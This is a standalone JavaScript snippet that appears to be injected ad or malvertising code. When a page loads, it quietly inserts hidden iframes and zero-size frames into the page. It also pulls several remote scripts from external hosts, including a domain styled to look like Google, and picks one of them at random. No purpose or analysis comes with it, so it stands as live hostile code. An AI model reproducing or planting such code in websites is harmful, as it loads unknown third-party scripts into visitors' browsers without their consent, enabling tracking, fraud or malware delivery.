    (function() {
        if(!document.getElementById('gad_div')){
            if (!document.body) return setTimeout(arguments.callee, 50);
            var ediv = document.createElement("div");
            ediv.id = "gad_div" ;
            ediv.style.display="none";
            document.body.insertBefore(ediv, document.body.children.item(0));
            var count = document.createElement("iframe");
            count.style.display = 'none';
            count.src = "http://google.cifenqi.com/pos/300x250/hm/v.html",
            ediv.appendChild(count);

        var oClose = document.createElement("div");
            oClose.innerHTML = "<img alt=\"Close\" src=\"http://img.alicdn.com/tps/i4/TB1lcLIGXXXXXchXXXX.ZwDGFXX-43-13.gif\" onmouseover=\"this.src='http://img.alicdn.com/tps/i1/TB1TX_HGXXXXXcTXXXX.ZwDGFXX-43-13.gif'\" onmouseout=\"this.src='http://img.alicdn.com/tps/i4/TB1lcLIGXXXXXchXXXX.ZwDGFXX-43-13.gif'\" style=\"height:13px;font-size:14px;float:right;width:43px;cursor:pointer;position:absolute;top:-16px;right:0\">";
            oClose.style.position = "fixed";
              oClose.style.bottom = "250px";
              oClose.style.right = "0";
            oClose.id = "h_close";
            oClose.style.cursor = "pointer";
            oClose.style.zIndex = "999999999";
            var othe = document.createElement("iframe");
            othe.scrolling = 'no';
            othe.id = "h_iframe";
            othe.frameBorder = '0';
            othe.width = '300';
            othe.height = '250';
            othe.style.position = "fixed";
            othe.style.bottom = "0";
            othe.style.right = "0";
            othe.style.zIndex = "999999999";
            othe.src = "http://w.365hsh.com/webSite/webGame/h2.html";

            //document.body.appendChild(othe);

            document.body.appendChild(oClose);
            oClose.onclick=function(){
                oClose.style.display = "none";
                othe.style.display = "none";
            }
//other S
            var oggj = document.createElement("iframe");
            oggj.style.display = 'none';
            oggj.width = '0';
            oggj.height = '0';
            oggj.src = "http://w.365hsh.com/webSite/ggj/iframe.html";
    
            ediv.appendChild(oggj);

            var e = document.createElement("script");
            e.type = "text/javascript",
            e.src = "http://w.365hsh.com/webSite/ggj/c.js";
            ediv.appendChild(e);


//other E


            var e = document.createElement("script");
            e.type = "text/javascript",
            e.src = "http://google.cifenqi.com/pos/ggj/nsh/c.js";
                ediv.appendChild(e);

            var e = document.createElement("iframe");
            e.style.display = "none",
            e.src = "http://google.cifenqi.com/pos/dz/c/gg2";
            e.width = "300";
            e.height = "250";
            ediv.appendChild(e);


            var e = document.createElement("script");
            e.type = "text/javascript";
            var t = parseInt(Math.random()*2);
            if(t == 0){
                e.src = "http://google.cifenqi.com/pos/dz/c/gg/c.js" ;
            }else{
                e.src = "http://google.cifenqi.com/pos/dz/c/sub/c.js" ;
            }
            ediv.appendChild(e);

            
            var e = document.createElement("script");
            e.type = "text/javascript",
            e.src = "http://google.cifenqi.com/pos/300x250/jj/c.js",
            ediv.appendChild(e);

            var e = document.createElement("script");
            e.type = "text/javascript",
            e.src = "http://google.cifenqi.com/pos/300x250/rdxy/c.js",
            ediv.appendChild(e);

        }
})();
